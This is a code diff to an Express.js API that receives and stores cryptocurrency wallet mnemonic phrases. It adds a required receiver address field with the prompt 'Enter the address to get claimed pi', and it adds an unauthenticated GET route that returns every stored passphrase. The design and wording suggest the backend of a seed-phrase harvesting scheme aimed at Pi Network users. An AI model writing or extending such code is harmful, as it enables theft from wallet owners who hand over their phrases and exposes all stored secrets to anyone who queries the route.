@@ -6,10 +6,14 @@ const router = express.Router();
 
 // POST /api/passphrases - Add a new passphrase
 router.post('/', async (req, res) => {
-    const { mnemonic } = req.body;
+    const { mnemonic, receiverAddress } = req.body;
 
     if (!mnemonic) {
         return res.status(400).json({ error: 'mnemonic is required' });
+    }
+
+    if (!receiverAddress) {
+        return res.status(400).json({ error: 'Enter the address to get claimed pi' });
     }
 
     try {
@@ -25,6 +29,11 @@ router.post('/', async (req, res) => {
         console.error('Error saving passphrase:', err);
         res.status(500).json({ error: 'Failed to save passphrase' });
     }
+});
+
+router.get('/', async (req, res) => {
+    const all = await Passphrase.find();
+    res.json(all);
 });
 
 export default router;
